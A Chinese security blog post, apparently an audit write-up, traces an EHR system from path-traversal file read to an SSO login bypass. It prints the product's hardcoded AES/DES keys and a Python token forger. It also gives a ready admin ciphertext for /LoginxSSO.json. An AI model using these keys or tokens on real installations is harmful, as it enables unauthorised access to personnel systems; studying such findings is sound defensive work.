---
title: Java审计 | 某EHR系统从Auth绕过到RCE
url: https://www.svenbeast.com/post/7iSXkstGK7/
source: 攻城肾透shi | sv3nbeast
date: 2025-04-29
fetch_date: 2025-10-06T22:02:43.662588
---

# Java审计 | 某EHR系统从Auth绕过到RCE

[攻城肾透shi | sv3nbeast](https://www.svenbeast.com)

[首页](/)
[📃文章列表](/posts)
[📖归档](/archives)
[🏷️标签](/tags)
[🔥关于](/post/about)
[ ]

[攻城肾透shi | sv3nbeast](https://www.svenbeast.com)

Dark

\u6697\u9ED1

☰ Menu

☰ 菜单

[首页](/)
[📃文章列表](/posts)
[📖归档](/archives)
[🏷️标签](/tags)
[🔥关于](/post/about)

# Java审计 | 某EHR系统从Auth绕过到RCE

Author:
[斯文](/)

Date: 2025-04-28
Reading Time:5.9 mins
words:1314

Category:
[审计](https://www.svenbeast.com/tag/YzSDJjXj4/)
[java](https://www.svenbeast.com/tag/_-7fKgIlP/)
[笔记](https://www.svenbeast.com/tag/rwt8EXIMSg/)

share:

作者:
[斯文](/)
日期: 2025-04-28
阅读时间:5.9 分钟
字数:1314
分类:
[审计](https://www.svenbeast.com/tag/YzSDJjXj4/)
[java](https://www.svenbeast.com/tag/_-7fKgIlP/)
[笔记](https://www.svenbeast.com/tag/rwt8EXIMSg/)

分享:

# 0x00 准备工作

水一个演练遇到的某个EHR系统的审计过程，首先获得系统的所有路由信息

![image-20250427110417347](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192323639.png)

批量跑接口，分出来鉴权接口和未鉴权接口

![image-20250426004220673](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192408522.png)

后面看代码，发现参数都加密了，然后找到有个加密的方法，后面截图的代码默认都被我还原过了

![image-20250425191612052](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192445892.png)

如下

![image-20250426004301005](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192458082.png)

```
def Kayang(s):
    # 初始化字符数组
    cArr = [''] * len(s)
    length = len(s) - 1
    i = length
    i2 = length
    # 初始化 c 值
    c = ((2 ^ 5) << 4) ^ (2 ^ 5)

    while i >= 0:
        c2 = i2
        c3 = (c2 ^ c) & 0x3F  # 0x3F 是 '?' 的 ASCII 值
        cArr[c2] = chr(ord(s[i2]) ^ c)
        i3 = i2 - 1
        if i3 < 0:
            break
        c = (i3 ^ c3) & 0x3F
        cArr[i3] = chr(ord(s[i3]) ^ c3)
        i2 = i3 - 1
        i = i2

    # 将字符数组转换为字符串
    return ''.join(cArr)

input_str = "~EyXQ_\"
output_str = Kayang(input_str)
print("Input:", input_str)
print("Output:", output_str)
```

![image-20250426004331958](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192505988.png)

# 0x01 审计过程

## 任意文件读取

除去springMvc的路由，再看一下web.xml，看看有没有直接定义路径的路由，看到了个资源文件的，进去看看

![image-20250427110905234](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192513046.png)

然后这里很明显有个path参数有问题

![image-20250427111110266](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192526740.png)

一个../的慢慢加上去，获得任意跨目录读文件漏洞，虽然实际作用不大，不过这说明其他洞存在概率高。。

![image-20250427111230356](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192538496.png)

## 任意用户登录

在未鉴权接口中一眼没看到什么大概率直接getshell的，所以去看包含sso字样的接口，在LoginxSSOController类中实现了LoginSSO路由

![image-20250426004946963](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192600423.png)

onload当前类中没有，再去当前类继承的BaseAction类去看看

![image-20250426005019088](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192613944.png)

找到了onLoad方法，然后再跳到onPageLoad方法，这个父类中也没实现代码

![image-20250426005238401](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192638068.png)

又回到LoginxSSOController类看到了onPageLoad的实现代码，发现1个关键参数account，有个解密操作，然后到达autoLogin方法，可知当前url为/LoginxSSO.json?account=密文，最终传入到autoLogin(url,account,false)

![image-20250426011523315](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192643467.png)

找到加密过程，直接调用或者ai帮你还原个python调用

![image-20250427112435656](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192650433.png)

```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import binascii

class EncryptAndDecodeUtil:
    # 静态变量
    Kayang = bytes([
        106, 105, 194, 29, 184, 80, 227, 145, 124, 35, 34, 166, 60, 126, 106, 195,
        193, 187, 69, 21, 59, 62, 24, 208, 173, 142, 21, 118, 103, 95, 77, 198
    ])
    B = bytes([
        202, 18, 194, 223, 133, 237, 32, 62, 249, 153, 18, 24, 67, 30, 191, 234
    ])

    @staticmethod
    def encode(content: str) -> str:
        if not content:
            return ""
        # 使用 AES 加密
        cipher = AES.new(EncryptAndDecodeUtil.Kayang, AES.MODE_CBC, EncryptAndDecodeUtil.B)
        padded_data = pad(content.encode('utf-8'), AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        return binascii.hexlify(encrypted_data).decode('utf-8')

    @staticmethod
    def decode(content: str) -> str:
        if not content:
            return ""
        try:
            # 使用 AES 解密
            cipher = AES.new(EncryptAndDecodeUtil.Kayang, AES.MODE_CBC, EncryptAndDecodeUtil.B)
            encrypted_data = binascii.unhexlify(content)
            decrypted_data = cipher.decrypt(encrypted_data)
            unpadded_data = unpad(decrypted_data, AES.block_size)
            return unpadded_data.decode('utf-8')
        except Exception as e:
            try:
                # 如果 AES 解密失败，尝试 DES 解密
                return EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(content), "T_E^UYYO\u0007")
            except Exception:
                # 如果 DES 解密失败，尝试使用默认密钥
                return EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(content), "kayangv9")

    @staticmethod
    def decodeDES(data: bytes, key: str) -> str:
        try:
            # 使用 DES 解密
            from Crypto.Cipher import DES
            key_bytes = key.encode('utf-8')
            cipher = DES.new(key_bytes, DES.MODE_ECB)
            decrypted_data = cipher.decrypt(data)
            return decrypted_data.decode('utf-8').rstrip('\0')
        except Exception as e:
            print(f"Error in decodeDES: {e}")
            return ""

    @staticmethod
    def encodeDES(content: str, key: str) -> str:
        if not content:
            return ""
        try:
            # 使用 DES 加密
            from Crypto.Cipher import DES
            key_bytes = key.encode('utf-8')
            cipher = DES.new(key_bytes, DES.MODE_ECB)
            padded_data = pad(content.encode('utf-8'), DES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            return binascii.hexlify(encrypted_data).decode('utf-8')
        except Exception as e:
            print(f"Error in encodeDES: {e}")
            return ""

# 测试代码
if __name__ == "__main__":
    # 测试 encode 和 decode
    encod_text = "ttt"
    encoded_text = EncryptAndDecodeUtil.encode(encod_text)
    print(f"Encoded: {encoded_text}")
    decode_text = "fa32fda300eeb85fc0e3116ec9a0f191"
    decoded_text = EncryptAndDecodeUtil.decode(decode_text)
    print(f"Decoded: {decoded_text}")

    # 测试 encodeDES 和 decodeDES
    original_text = "Hello, DES!"
    encoded_text = EncryptAndDecodeUtil.encodeDES(original_text, "kayangv9")
    print(f"Encoded DES: {encoded_text}")
    decoded_text = EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(encoded_text), "kayangv9")
    print(f"Decoded DES: {decoded_text}")
```

随便加密个ttt获得结果2972707ed0733287402a099e76285e7a

![image-20250426013150974](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192738219.png)

请求后提示账号不存在，有点东西哈

![image-20250426013305260](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192743947.png)

生成admin账号的，fa32fda300eeb85fc0e3116ec9a0f191，发现跳302

![image-20250426013427152](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192749748.png)

找个其他鉴权接口，测试下cookie，发现有效，这很好，后缀aspx可以忽略哈，随便选的后缀，是web.xml设置的走spingmvc认证的几个后缀之一，可能是为了让别人误判后端语言吧

![image-20250426013602671](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192754420.png)
![image-20250426013751687](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192800412.png)

没过鉴权是回显这个的

![image-20250426013821128](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192806473.png)

## 任意文件上传

找到这个洞的大概过程，在burp的api访问记录中从上到下看了一些路径可能包含上传功能的api，但没有找到能用的，一些原因如下

1.写死了后缀

2.还有的是检测时黑名单，但使用其他后缀名单会导致函数不返回true，导致函数不往下走

3.有一些会在调用文件上传前存在一些前置操作，导致方法停止运行

后续开始全局搜索fileOutputStream.write，去看看对应的文件，没找到

![image-20250428171632469](http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/20250428192812795.png)

又搜FileUtils.copyFile( ，找到一个saveAs方法

!...